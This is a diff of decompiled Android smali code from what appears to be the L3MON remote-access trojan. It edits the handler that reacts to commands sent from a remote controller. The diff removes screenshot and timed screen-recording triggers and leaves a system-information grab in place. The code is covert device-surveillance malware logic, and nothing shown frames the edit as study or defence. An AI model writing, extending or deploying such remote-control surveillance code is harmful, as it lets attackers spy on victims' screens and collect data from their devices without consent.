@@ -386,25 +386,6 @@
     .end local v1    # "data":Lorg/json/JSONObject;
     .end local v2    # "order":Ljava/lang/String;
     :cond_3
-    # add screenshot action: files { action: "sc" }
-    :try_start_3
-    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v0
-
-    const-string v3, "sc"
-
-    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
-
-    move-result v0
-
-    if-eqz v0, :goto_1
-
-    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->SC()V
-    :try_end_3
-    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
-
-    :goto_1
     # system info direct trigger
     :try_start_4
     invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
@@ -416,22 +397,7 @@
     invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->SI()V
     :try_end_4
     .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
-    # screen record direct trigger with seconds
-    :try_start_5
-    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
-    move-result-object v0
-    const-string v3, "0xSR"
-    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
-    move-result v0
-    if-eqz v0, :goto_2
-    const-string v0, "sec"
-    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
-    move-result-object v0
-    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
-    move-result v0
-    invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->SR(I)V
-    :try_end_5
-    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
+
     goto :goto_2
 
 
